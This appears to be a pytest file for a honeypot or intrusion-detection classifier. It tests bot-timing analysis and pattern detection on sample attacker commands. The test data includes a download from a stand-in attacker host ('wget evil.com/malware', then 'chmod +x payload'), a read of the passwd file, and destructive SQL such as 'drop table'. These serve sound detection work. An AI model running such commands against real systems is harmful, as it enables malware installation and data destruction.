"""Tests for behavior classification"""
import pytest
from src.detection.behavior import analyze_timing, detect_patterns, classify_behavior

def test_bot_timing():
    latencies = [0.1, 0.1, 0.1, 0.1]
    result = analyze_timing(latencies)
    assert result["is_bot"] == True
    assert result["variance"] < 0.01

def test_human_timing():
    latencies = [1.0, 2.5, 0.5, 3.0, 1.5]
    result = analyze_timing(latencies)
    assert result["is_bot"] == False

def test_sqli_detection():
    commands = ["ls", "select * from users", "cat passwd"]
    assert detect_patterns(commands) == "SQL_INJECTION"

def test_malware_detection():
    commands = ["wget evil.com/malware", "chmod +x payload"]
    assert detect_patterns(commands) == "MALWARE_DOWNLOAD"

def test_full_classification():
    commands = ["select * from", "drop table"]
    latencies = [0.1, 0.1, 0.1]
    result = classify_behavior(commands, latencies)
    assert result["classification"] in ["BOT", "AUTOMATED_SCANNER", "UNKNOWN"]